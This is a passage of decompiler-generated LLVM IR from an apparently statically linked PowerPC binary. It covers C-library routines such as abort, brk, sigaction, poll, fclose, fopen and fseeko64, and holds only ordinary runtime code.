  %v1_100139c0 = load i32, i32* %r30.global-to-local, align 4
  %v2_100139c0 = add i32 %v1_100139c0, 136
  %v3_100139c0 = inttoptr i32 %v2_100139c0 to i32*
  %v0_100139c4 = load i32, i32* %r0.global-to-local, align 4
  %v1_100139c4 = load i32, i32* %r30.global-to-local, align 4
  %v2_100139c4 = add i32 %v1_100139c4, 132
  %v3_100139c4 = inttoptr i32 %v2_100139c4 to i32*
  store i32 %v0_100139c4, i32* %v3_100139c4, align 4
  %v0_100139cc.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_100139c8

dec_label_pc_100139c8:                            ; preds = %dec_label_pc_1001399c, %dec_label_pc_1001396c, %dec_label_pc_100139ac
  %v0_100139cc = phi i32 [ %v0_10013988, %dec_label_pc_1001399c ], [ %v0_10013988, %dec_label_pc_1001396c ], [ %v0_100139cc.pre, %dec_label_pc_100139ac ]
  store i32 %v0_10013920, i32* %r0.global-to-local, align 4
  ret i32 %v0_100139cc

; uselistorder directives
  uselistorder i32 %v0_10013988, { 0, 1, 3, 2 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32* null, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_100139c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001396c, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_10013a14.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v0_100139f8 = call i32 @__pthread_return_0()
  %v2_10013a00 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10013a00, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 31, i32* %r9.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v3_10013a1833 = add i32 %v2_10013a00, 124
  %v4_10013a1834 = inttoptr i32 %v3_10013a1833 to i32*
  store i32 0, i32* %v4_10013a1834, align 4
  %v0_10013a1c35 = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a1c36 = add i32 %v0_10013a1c35, -1
  store i32 %v1_10013a1c36, i32* %r9.global-to-local, align 4
  %v0_10013a2037 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013a2038 = add i32 %v0_10013a2037, -1
  store i32 %v1_10013a2038, i32* %ctr.global-to-local, align 4
  %v2_10013a2039 = icmp eq i32 %v1_10013a2038, 0
  br i1 %v2_10013a2039, label %dec_label_pc_10013a24, label %dec_label_pc_10013a14.dec_label_pc_10013a14_crit_edge

dec_label_pc_10013a14.dec_label_pc_10013a14_crit_edge: ; preds = %dec_label_pc_10013a14.lr.ph, %dec_label_pc_10013a14.dec_label_pc_10013a14_crit_edge
  %v1_10013a1c40 = phi i32 [ %v1_10013a1c, %dec_label_pc_10013a14.dec_label_pc_10013a14_crit_edge ], [ %v1_10013a1c36, %dec_label_pc_10013a14.lr.ph ]
  %v0_10013a18.pre = load i32, i32* %r11.global-to-local, align 4
  %v1_10013a18.pre = load i32, i32* %r29.global-to-local, align 4
  %v1_10013a14 = mul i32 %v1_10013a1c40, 4
  %v3_10013a18 = add i32 %v1_10013a14, %v1_10013a18.pre
  %v4_10013a18 = inttoptr i32 %v3_10013a18 to i32*
  store i32 %v0_10013a18.pre, i32* %v4_10013a18, align 4
  %v0_10013a1c = load i32, i32* %r9.global-to-local, align 4
  %v1_10013a1c = add i32 %v0_10013a1c, -1
  store i32 %v1_10013a1c, i32* %r9.global-to-local, align 4
  %v0_10013a20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013a20 = add i32 %v0_10013a20, -1
  store i32 %v1_10013a20, i32* %ctr.global-to-local, align 4
  %v2_10013a20 = icmp eq i32 %v1_10013a20, 0
  br i1 %v2_10013a20, label %dec_label_pc_10013a24, label %dec_label_pc_10013a14.dec_label_pc_10013a14_crit_edge

dec_label_pc_10013a24:                            ; preds = %dec_label_pc_10013a14.dec_label_pc_10013a14_crit_edge, %dec_label_pc_10013a14.lr.ph
  store i32 %v2_10013a00, i32* @r3, align 4
  store i32 6, i32* @r4, align 4
  %v0_10013a2c = call i32 @__sigaddset()
  %v3_10013a30 = icmp eq i32 %v0_10013a2c, 0
  br i1 %v3_10013a30, label %dec_label_pc_10013a38, label %dec_label_pc_10013a48

dec_label_pc_10013a38:                            ; preds = %dec_label_pc_10013a24
  store i32 268515912, i32* @lr, align 4
  %v3_10013a44 = call i32 @__GI_sigprocmask(i32 1, i32 %v2_10013a00, i32 0)
  br label %dec_label_pc_10013a48

dec_label_pc_10013a48:                            ; preds = %dec_label_pc_10013a24, %dec_label_pc_10013a38
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10013a4c = load i32, i32* @global_var_1002ac1c.703, align 4
  %v3_10013a50 = icmp eq i32 %v3_10013a4c, 0
  br i1 %v3_10013a50, label %dec_label_pc_10013a58, label %dec_label_pc_10013a80

dec_label_pc_10013a58:                            ; preds = %dec_label_pc_10013a48
  store i32 1, i32* @global_var_1002ac1c.703, align 4
  br label %dec_label_pc_10013a60

dec_label_pc_10013a60:                            ; preds = %dec_label_pc_10013adc, %dec_label_pc_10013a58
  store i32 ptrtoint (i32* @global_var_1002ab40.701 to i32), i32* %r29.global-to-local, align 4
  %v0_10013a6c = call i32 @__pthread_return_0()
  store i32 268515960, i32* @lr, align 4
  %v1_10013a74 = call i32 @__raise(i32 6)
  %v0_10013a7c = call i32 @__pthread_return_0()
  %v3_10013a84.pre = load i32, i32* @global_var_1002ac1c.703, align 4
  br label %dec_label_pc_10013a80

dec_label_pc_10013a80:                            ; preds = %dec_label_pc_10013a48, %dec_label_pc_10013a60
  %v0_10013af8 = phi i32 [ %v3_10013a4c, %dec_label_pc_10013a48 ], [ %v3_10013a84.pre, %dec_label_pc_10013a60 ]
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r9.global-to-local, align 4
  %v3_10013a88 = icmp eq i32 %v0_10013af8, 1
  br i1 %v3_10013a88, label %dec_label_pc_10013ac8.lr.ph, label %dec_label_pc_10013af8

dec_label_pc_10013ac8.lr.ph:                      ; preds = %dec_label_pc_10013a80
  %v2_10013a94 = ptrtoint i32* %stack_var_-168 to i32
  store i32 2, i32* @global_var_1002ac1c.703, align 4
  store i32 ptrtoint (i32* @global_var_10013aa8.705 to i32), i32* @lr, align 4
  %v3_10013aa4 = call i32 @__GI_memset(i32 %v2_10013a94, i32 0, i32 140)
  store i32 %v2_10013a00, i32* %r8.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %stack_var_-168, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  store i32 %v3_10013a1833, i32* %r9.global-to-local, align 4
  %v2_10013ad025 = add i32 %v2_10013a00, 256
  %v3_10013ad026 = inttoptr i32 %v2_10013ad025 to i32*
  store i32 -1, i32* %v3_10013ad026, align 4
  %v0_10013ad427 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013ad428 = add i32 %v0_10013ad427, -1
  store i32 %v1_10013ad428, i32* %r11.global-to-local, align 4
  %v0_10013ad829 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013ad830 = add i32 %v0_10013ad829, -1
  store i32 %v1_10013ad830, i32* %ctr.global-to-local, align 4
  %v2_10013ad831 = icmp eq i32 %v1_10013ad830, 0
  br i1 %v2_10013ad831, label %dec_label_pc_10013adc, label %dec_label_pc_10013ac8.dec_label_pc_10013ac8_crit_edge

dec_label_pc_10013ac8.dec_label_pc_10013ac8_crit_edge: ; preds = %dec_label_pc_10013ac8.lr.ph, %dec_label_pc_10013ac8.dec_label_pc_10013ac8_crit_edge
  %v1_10013ad432 = phi i32 [ %v1_10013ad4, %dec_label_pc_10013ac8.dec_label_pc_10013ac8_crit_edge ], [ %v1_10013ad428, %dec_label_pc_10013ac8.lr.ph ]
  %v1_10013acc.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_10013ad0.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_10013ac8 = mul i32 %v1_10013ad432, 4
  %v2_10013acc = add i32 %v1_10013ac8, %v1_10013acc.pre
  store i32 %v2_10013acc, i32* %r9.global-to-local, align 4
  %v2_10013ad0 = add i32 %v2_10013acc, 132
  %v3_10013ad0 = inttoptr i32 %v2_10013ad0 to i32*
  store i32 %v0_10013ad0.pre, i32* %v3_10013ad0, align 4
  %v0_10013ad4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10013ad4 = add i32 %v0_10013ad4, -1
  store i32 %v1_10013ad4, i32* %r11.global-to-local, align 4
  %v0_10013ad8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10013ad8 = add i32 %v0_10013ad8, -1
  store i32 %v1_10013ad8, i32* %ctr.global-to-local, align 4
  %v2_10013ad8 = icmp eq i32 %v1_10013ad8, 0
  br i1 %v2_10013ad8, label %dec_label_pc_10013adc, label %dec_label_pc_10013ac8.dec_label_pc_10013ac8_crit_edge

dec_label_pc_10013adc:                            ; preds = %dec_label_pc_10013ac8.dec_label_pc_10013ac8_crit_edge, %dec_label_pc_10013ac8.lr.ph
  store i32 268516084, i32* @lr, align 4
  %v4_10013af0 = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-168, i32 0)
  br label %dec_label_pc_10013a60

dec_label_pc_10013af8:                            ; preds = %dec_label_pc_10013a80
  %v3_10013af8 = icmp eq i32 %v0_10013af8, 2
  br i1 %v3_10013af8, label %dec_label_pc_10013b00, label %dec_label_pc_10013b0c

dec_label_pc_10013b00:                            ; preds = %dec_label_pc_10013af8
  store i32 3, i32* @global_var_1002ac1c.703, align 4
  br label %dec_label_pc_10013b0c

dec_label_pc_10013b0c:                            ; preds = %dec_label_pc_10013af8, %dec_label_pc_10013b00
  %v3_10013b0c = phi i32 [ %v0_10013af8, %dec_label_pc_10013af8 ], [ 3, %dec_label_pc_10013b00 ]
  %v1_10013b14 = icmp ne i32 %v3_10013b0c, 3
  call void @__pseudo_cond_branch(i1 %v1_10013b14, i32 268516136)
  store i32 4, i32* @global_var_1002ac1c.703, align 4
  %v1_10013b24 = call i32 @__GI__exit(i32 127)
  ret i32 %v1_10013b24

; uselistorder directives
  uselistorder i32 %v1_10013ad8, { 1, 0 }
  uselistorder i32 %v1_10013ad4, { 1, 0 }
  uselistorder i32 %v1_10013a20, { 1, 0 }
  uselistorder i32 %v1_10013a1c, { 1, 0 }
  uselistorder i32 %v2_10013a00, { 0, 2, 3, 4, 1, 5 }
  uselistorder i32* %r9.global-to-local, { 4, 0, 5, 6, 8, 7, 1, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 4, 3, 0, 1, 2, 5, 6 }
  uselistorder i32* %ctr.global-to-local, { 7, 6, 0, 2, 3, 9, 8, 1, 4, 5 }
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 12, 25, 24, 23, 22, 21, 11, 10, 9, 8, 7, 6, 5, 4, 3, 20, 19, 18, 17, 16, 15, 14, 13, 2 }
  uselistorder i32 127, { 2, 8, 0, 3, 5, 9, 1, 6, 7, 4 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 2, 0, 1 }
  uselistorder i32 132, { 4, 2, 3, 0, 1 }
  uselistorder i32* @global_var_1002ac1c.703, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @__GI_sigprocmask, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @__sigaddset, { 0, 4, 3, 2, 1 }
  uselistorder i32 124, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10013b0c, { 1, 0 }
  uselistorder label %dec_label_pc_10013ac8.dec_label_pc_10013ac8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10013a80, { 1, 0 }
  uselistorder label %dec_label_pc_10013a48, { 1, 0 }
  uselistorder label %dec_label_pc_10013a14.dec_label_pc_10013a14_crit_edge, { 1, 0 }
}

define i32 @_dl_aux_init(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10013b30 = add i32 %arg1, 28
  %v2_10013b30 = inttoptr i32 %v1_10013b30 to i32*
  %v3_10013b30 = load i32, i32* %v2_10013b30, align 4
  store i32 %v3_10013b30, i32* @global_var_1002ac20.706, align 4
  %v1_10013b40 = add i32 %arg1, 44
  %v2_10013b40 = inttoptr i32 %v1_10013b40 to i32*
  %v3_10013b40 = load i32, i32* %v2_10013b40, align 4
  store i32 %v3_10013b40, i32* @global_var_1002ac24.707, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @global_var_1002ac28.670, align 4
  %v0_10013b74 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 true, i32 %v0_10013b74)
  store i32 12, i32* @r3, align 4
  %v0_10013b7c = call i32 @__syscall_error()
  ret i32 %v0_10013b7c

; uselistorder directives
  uselistorder i32* @global_var_1002ac28.670, { 1, 0, 2 }
}

define i32 @__syscall_rt_sigaction() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10013b98 = call i32 @__asm_mfcr()
  %v1_10013b9c = and i32 %v0_10013b98, 268435456
  %v3_10013b9c = icmp eq i32 %v1_10013b9c, 0
  store i1 false, i1* @cr0_so, align 1
  store i32 %v0_10013b98, i32* %r31.global-to-local, align 4
  br i1 %v3_10013b9c, label %dec_label_pc_10013bb4, label %dec_label_pc_10013ba8

dec_label_pc_10013ba8:                            ; preds = %entry
  %v0_10013ba8 = call i32 @__errno_location()
  %v0_10013bac = load i32, i32* %r31.global-to-local, align 4
  %v2_10013bac = inttoptr i32 %v0_10013ba8 to i32*
  store i32 %v0_10013bac, i32* %v2_10013bac, align 4
  br label %dec_label_pc_10013bb4

dec_label_pc_10013bb4:                            ; preds = %entry, %dec_label_pc_10013ba8
  %v0_10013bc4 = phi i32 [ %v0_10013b98, %entry ], [ -1, %dec_label_pc_10013ba8 ]
  ret i32 %v0_10013bc4

; uselistorder directives
  uselistorder i1* @cr0_so, { 3, 0, 7, 8, 9, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_10013bb4, { 1, 0 }
}

define i32 @__libc_poll(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10013be0 = call i32 @__asm_mfcr()
  %v1_10013be4 = and i32 %v0_10013be0, 268435456
  %v3_10013be4 = icmp eq i32 %v1_10013be4, 0
  store i32 %v0_10013be0, i32* %r31.global-to-local, align 4
  br i1 %v3_10013be4, label %dec_label_pc_10013bfc, label %dec_label_pc_10013bf0

dec_label_pc_10013bf0:                            ; preds = %entry
  %v0_10013bf0 = call i32 @__errno_location()
  %v0_10013bf4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10013bf4 = inttoptr i32 %v0_10013bf0 to i32*
  store i32 %v0_10013bf4, i32* %v2_10013bf4, align 4
  br label %dec_label_pc_10013bfc

dec_label_pc_10013bfc:                            ; preds = %entry, %dec_label_pc_10013bf0
  %v0_10013c0c = phi i32 [ %v0_10013be0, %entry ], [ -1, %dec_label_pc_10013bf0 ]
  ret i32 %v0_10013c0c

; uselistorder directives
  uselistorder label %dec_label_pc_10013bfc, { 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10013c24 = add i32 %tmp, 52
  %v3_10013c24 = inttoptr i32 %v2_10013c24 to i32*
  %v4_10013c24 = load i32, i32* %v3_10013c24, align 4
  store i32 %v4_10013c24, i32* @r28, align 4
  %v3_10013c28 = icmp eq i32 %v4_10013c24, 0
  store i1 %v3_10013c28, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10013c28, label %dec_label_pc_10013c30, label %dec_label_pc_10013c50

dec_label_pc_10013c30:                            ; preds = %entry
  %v2_10013c38 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10013c38, i32* @r3, align 4
  %v0_10013c44 = call i32 @__pthread_return_void()
  %v0_10013c4c = call i32 @__pthread_return_0()
  %v0_10013c50.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013c50

dec_label_pc_10013c50:                            ; preds = %entry, %dec_label_pc_10013c30
  %v0_10013c60 = phi i32 [ %tmp, %entry ], [ %v0_10013c50.pre, %dec_label_pc_10013c30 ]
  %v1_10013c50 = inttoptr i32 %v0_10013c60 to i16*
  %v2_10013c50 = load i16, i16* %v1_10013c50, align 2
  %v3_10013c50 = zext i16 %v2_10013c50 to i32
  store i32 0, i32* @r27, align 4
  %v1_10013c58 = and i32 %v3_10013c50, 64
  %v3_10013c58 = icmp eq i32 %v1_10013c58, 0
  br i1 %v3_10013c58, label %dec_label_pc_10013c6c, label %dec_label_pc_10013c60

dec_label_pc_10013c60:                            ; preds = %dec_label_pc_10013c50
  store i32 268516456, i32* @lr, align 4
  %v4_10013c64 = call i32 @fflush_unlocked(i16* %v1_10013c50, i32 %v1_10013c58)
  store i32 %v4_10013c64, i32* @r27, align 4
  %v0_10013c6c.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013c6c

dec_label_pc_10013c6c:                            ; preds = %dec_label_pc_10013c50, %dec_label_pc_10013c60
  %v0_10013c6c = phi i32 [ %v0_10013c60, %dec_label_pc_10013c50 ], [ %v0_10013c6c.pre, %dec_label_pc_10013c60 ]
  %v1_10013c6c = add i32 %v0_10013c6c, 4
  %v2_10013c6c = inttoptr i32 %v1_10013c6c to i32*
  %v3_10013c6c = load i32, i32* %v2_10013c6c, align 4
  store i32 268516468, i32* @lr, align 4
  %v1_10013c70 = call i32 @__libc_close(i32 %v3_10013c6c)
  %v3_10013c74 = icmp eq i32 %v1_10013c70, 0
  store i1 %v3_10013c74, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10013c70, -1
  br i1 %tmp8, label %dec_label_pc_10013c80, label %dec_label_pc_10013c7c

dec_label_pc_10013c7c:                            ; preds = %dec_label_pc_10013c6c
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10013c80

dec_label_pc_10013c80:                            ; preds = %dec_label_pc_10013c6c, %dec_label_pc_10013c7c
  store i32 ptrtoint ([3 x i8]* @global_var_10011770.591 to i32), i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_1002a848.589 to i32), i32* @r29, align 4
  %v1_10013c94 = load i32, i32* @r31, align 4
  %v2_10013c94 = add i32 %v1_10013c94, 4
  %v3_10013c94 = inttoptr i32 %v2_10013c94 to i32*
  store i32 -1, i32* %v3_10013c94, align 4
  %v2_10013c98 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10013c98, i32* @r30, align 4
  store i32 %v2_10013c98, i32* @r3, align 4
  %v0_10013ca8 = call i32 @__pthread_return_void()
  %v0_10013cb0 = call i32 @__pthread_return_0()
  %v3_10013cb8 = load i32, i32* @global_var_1002abe0.708, align 4
  store i32 %v2_10013c98, i32* @r3, align 4
  %v1_10013cc4 = add i32 %v3_10013cb8, 1
  store i32 %v1_10013cc4, i32* @global_var_1002abe0.708, align 4
  %v0_10013ccc = call i32 @__pthread_return_void()
  %v0_10013cd0 = load i32, i32* @r31, align 4
  %v1_10013cd0 = inttoptr i32 %v0_10013cd0 to i16*
  %v2_10013cd0 = load i16, i16* %v1_10013cd0, align 2
  %v3_10013cd0 = zext i16 %v2_10013cd0 to i32
  %v0_10013cd4 = load i32, i32* @r28, align 4
  %v3_10013cd4 = icmp eq i32 %v0_10013cd4, 0
  store i1 %v3_10013cd4, i1* %cr7_eq.global-to-local, align 1
  %v1_10013cd8 = call i32 @__asm_rlwinm(i32 %v3_10013cd0, i32 0, i32 17, i32 18)
  %v1_10013ce0 = or i32 %v1_10013cd8, 48
  %v1_10013ce4 = trunc i32 %v1_10013ce0 to i16
  %v2_10013ce4 = load i32, i32* @r31, align 4
  %v3_10013ce4 = inttoptr i32 %v2_10013ce4 to i16*
  store i16 %v1_10013ce4, i16* %v3_10013ce4, align 2
  %v0_10013ce8 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10013ce8, label %dec_label_pc_10013cec, label %dec_label_pc_10013cf8

dec_label_pc_10013cec:                            ; preds = %dec_label_pc_10013c80
  %v2_10013cec = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10013cec, i32* @r3, align 4
  %v0_10013cf4 = call i32 @__pthread_return_void()
  br label %dec_label_pc_10013cf8

dec_label_pc_10013cf8:                            ; preds = %dec_label_pc_10013c80, %dec_label_pc_10013cec
  %v0_10013cf8 = load i32, i32* @r31, align 4
  %v1_10013cf8 = inttoptr i32 %v0_10013cf8 to i16*
  %v2_10013cf8 = load i16, i16* %v1_10013cf8, align 2
  %v1_10013cfc = and i16 %v2_10013cf8, 16384
  %v3_10013cfc = icmp eq i16 %v1_10013cfc, 0
  br i1 %v3_10013cfc, label %dec_label_pc_10013d0c, label %dec_label_pc_10013d04

dec_label_pc_10013d04:                            ; preds = %dec_label_pc_10013cf8
  %v1_10013d04 = add i32 %v0_10013cf8, 8
  %v2_10013d04 = inttoptr i32 %v1_10013d04 to i32*
  %v3_10013d04 = load i32, i32* %v2_10013d04, align 4
  store i32 268516620, i32* @lr, align 4
  %v1_10013d08 = call i32 @free(i32 %v3_10013d04)
  br label %dec_label_pc_10013d0c

dec_label_pc_10013d0c:                            ; preds = %dec_label_pc_10013cf8, %dec_label_pc_10013d04
  store i32 %v2_10013c98, i32* @r3, align 4
  %v0_10013d18 = call i32 @__pthread_return_void()
  %v0_10013d20 = call i32 @__pthread_return_0()
  %v3_10013d28 = load i16*, i16** @global_var_1002abe4.709, align 4
  %v4_10013d28 = ptrtoint i16* %v3_10013d28 to i32
  store i32 %v2_10013c98, i32* @r3, align 4
  %v1_10013d34 = add i32 %v4_10013d28, 1
  %v4_10013d38 = inttoptr i32 %v1_10013d34 to i16*
  store i16* %v4_10013d38, i16** @global_var_1002abe4.709, align 4
  %v0_10013d3c = call i32 @__pthread_return_void()
  store i32 268516676, i32* @lr, align 4
  %v0_10013d40 = call i32 @_stdio_openlist_dec_use()
  %v0_10013d48 = load i32, i32* @r27, align 4
  ret i32 %v0_10013d48

; uselistorder directives
  uselistorder i32 %tmp, { 0, 2, 1 }
  uselistorder i32 17, { 17, 2, 3, 18, 4, 13, 14, 5, 15, 6, 7, 8, 9, 10, 21, 22, 19, 20, 0, 1, 11, 12, 16 }
  uselistorder i32 (i32)* @__libc_close, { 18, 2, 1, 14, 33, 32, 31, 17, 16, 15, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 13, 12, 11, 0, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder label %dec_label_pc_10013d0c, { 1, 0 }
  uselistorder label %dec_label_pc_10013cf8, { 1, 0 }
  uselistorder label %dec_label_pc_10013c80, { 1, 0 }
  uselistorder label %dec_label_pc_10013c6c, { 1, 0 }
  uselistorder label %dec_label_pc_10013c50, { 1, 0 }
}

define i32 @__GI_fopen(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r6, align 4
  %v3_10013d64 = call i32 @_stdio_fopen(i32 0, i8* inttoptr (i32 -1 to i8*))
  ret i32 %v3_10013d64
}

define i32 @__GI_fseek(i32 %arg1) local_unnamed_addr {
entry:
  %v0_10013d68 = load i32, i32* @r5, align 4
  store i32 %v0_10013d68, i32* @r7, align 4
  %tmp = icmp slt i32 %arg1, 0
  %v1_10013d70 = zext i1 %tmp to i32
  %v2_10013d70 = ashr i32 %arg1, 31
  %v3_10013d70 = and i32 %v2_10013d70, -2
  %v4_10013d70 = or i32 %v3_10013d70, %v1_10013d70
  %v3_10013d74 = inttoptr i32 %v4_10013d70 to i16*
  %v4_10013d74 = call i32 @__GI_fseeko64(i16* %v3_10013d74, i32 %arg1, i32 %v0_10013d68)
  ret i32 %v4_10013d74

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
}

define i32 @__GI_fseeko64(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10013d78 = load i32, i32* @r7, align 4
  %v0_10013d7c = load i32, i32* @lr, align 4
  store i32 %v0_10013d7c, i32* %r0.global-to-local, align 4
  store i32 %v0_10013d78, i32* @r30, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 %arg2, i32* %stack_var_-56, align 4
  %tmp9 = icmp ult i32 %v0_10013d78, 3
  br i1 %tmp9, label %dec_label_pc_10013db4, label %dec_label_pc_10013da0

dec_label_pc_10013da0:                            ; preds = %entry
  %v0_10013da0 = call i32 @__errno_location()
  store i32 -1, i32* @r30, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10013dac = inttoptr i32 %v0_10013da0 to i32*
  store i32 22, i32* %v2_10013dac, align 4
  br label %dec_label_pc_10013e7c

dec_label_pc_10013db4:                            ; preds = %entry
  %v2_10013db4 = add i32 %tmp, 52
  %v3_10013db4 = inttoptr i32 %v2_10013db4 to i32*
  %v4_10013db4 = load i32, i32* %v3_10013db4, align 4
  store i32 %v4_10013db4, i32* @r28, align 4
  %v3_10013db8 = icmp eq i32 %v4_10013db4, 0
  br i1 %v3_10013db8, label %dec_label_pc_10013dc0, label %dec_label_pc_10013de0

dec_label_pc_10013dc0:                            ; preds = %dec_label_pc_10013db4
  %v2_10013dc0 = add i32 %tmp, 56
  store i32 %v2_10013dc0, i32* @r29, align 4
  %v2_10013dc8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_10013dc8, i32* @r3, align 4
  %v0_10013dd4 = call i32 @__pthread_return_void()
  %v0_10013ddc = call i32 @__pthread_return_0()
  %v0_10013de0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013de0

dec_label_pc_10013de0:                            ; preds = %dec_label_pc_10013db4, %dec_label_pc_10013dc0
  %v0_10013dec = phi i32 [ %tmp, %dec_label_pc_10013db4 ], [ %v0_10013de0.pre, %dec_label_pc_10013dc0 ]
  %v1_10013de0 = inttoptr i32 %v0_10013dec to i16*
  %v2_10013de0 = load i16, i16* %v1_10013de0, align 2
  %v3_10013de0 = zext i16 %v2_10013de0 to i32
  store i32 %v3_10013de0, i32* %r0.global-to-local, align 4
  %v1_10013de4 = and i32 %v3_10013de0, 64
  store i32 %v1_10013de4, i32* %r9.global-to-local, align 4
  %v3_10013de4 = icmp eq i32 %v1_10013de4, 0
  br i1 %v3_10013de4, label %dec_label_pc_10013dfc, label %dec_label_pc_10013dec

dec_label_pc_10013dec:                            ; preds = %dec_label_pc_10013de0
  store i32 %v0_10013dec, i32* @r3, align 4
  store i32 268516852, i32* @lr, align 4
  %v0_10013df0 = call i32 @__stdio_wcommit()
  %v3_10013df4 = icmp eq i32 %v0_10013df0, 0
  br i1 %v3_10013df4, label %dec_label_pc_10013dfc, label %dec_label_pc_10013e64

dec_label_pc_10013dfc:                            ; preds = %dec_label_pc_10013dec, %dec_label_pc_10013de0
  %v0_10013dfc = load i32, i32* @r30, align 4
  %v3_10013dfc = icmp eq i32 %v0_10013dfc, 1
  br i1 %v3_10013dfc, label %dec_label_pc_10013e04, label %dec_label_pc_10013dfc.dec_label_pc_10013e18_crit_edge

dec_label_pc_10013dfc.dec_label_pc_10013e18_crit_edge: ; preds = %dec_label_pc_10013dfc
  br label %dec_label_pc_10013e18

dec_label_pc_10013e04:                            ; preds = %dec_label_pc_10013dfc
  %v0_10013e04 = load i32, i32* @r31, align 4
  %v1_10013e04 = inttoptr i32 %v0_10013e04 to i16*
  %v2_10013e08 = ptrtoint i32* %stack_var_-56 to i32
  store i32 268516880, i32* @lr, align 4
  %v4_10013e0c = call i32 @__stdio_adjust_position(i16* %v1_10013e04, i32 %v2_10013e08)
  %v1_10013e10 = icmp slt i32 %v4_10013e0c, 0
  br i1 %v1_10013e10, label %dec_label_pc_10013e64, label %dec_label_pc_10013e04.dec_label_pc_10013e18_crit_edge

dec_label_pc_10013e04.dec_label_pc_10013e18_crit_edge: ; preds = %dec_label_pc_10013e04
  %v0_10013e18.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10013e18

dec_label_pc_10013e18:                            ; preds = %dec_label_pc_10013dfc.dec_label_pc_10013e18_crit_edge, %dec_label_pc_10013e04.dec_label_pc_10013e18_crit_edge
  %v0_10013e18 = phi i32 [ %v0_10013dfc, %dec_label_pc_10013dfc.dec_label_pc_10013e18_crit_edge ], [ %v0_10013e18.pre, %dec_label_pc_10013e04.dec_label_pc_10013e18_crit_edge ]
  %v0_10013e1c = load i32, i32* @r31, align 4
  store i32 268516904, i32* @lr, align 4
  %v5_10013e24 = call i32 @__stdio_seek(i32 %v0_10013e1c, i32* nonnull %stack_var_-56, i32 %v0_10013e18)
  %v1_10013e28 = icmp slt i32 %v5_10013e24, 0
  br i1 %v1_10013e28, label %dec_label_pc_10013e64, label %dec_label_pc_10013e30

